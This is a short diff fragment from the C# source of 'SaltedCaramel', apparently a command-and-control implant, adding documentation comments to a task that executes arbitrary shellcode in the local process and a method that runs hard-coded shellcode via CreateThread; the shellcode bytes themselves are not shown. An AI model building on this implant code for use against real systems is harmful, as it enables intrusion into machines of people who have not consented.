@@ -6,6 +6,11 @@ namespace SaltedCaramel.Tasks
 {
     public class Shellcode
     {
+        /// <summary>
+        /// Execute arbitrary shellcode into the local process.
+        /// </summary>
+        /// <param name="job">Job associated with this task.</param>
+        /// <param name="agent">Agent associated with this task.</param>
         public static void Execute(Job job, SCImplant agent)
         {
             SCTask task = job.Task;
@@ -15,6 +20,12 @@ namespace SaltedCaramel.Tasks
                 task.message = "Shellcode loaded.";
             }
         }
+
+        /// <summary>
+        /// Execute hard-coded shellcode in the local process
+        /// (Calvin why???) via CreateThread.
+        /// </summary>
+        /// <returns>TRUE if successful. Otherwise, will not return.</returns>
         public static bool LoadShellcode()
         {
             byte[] shellcode = new byte[294] {
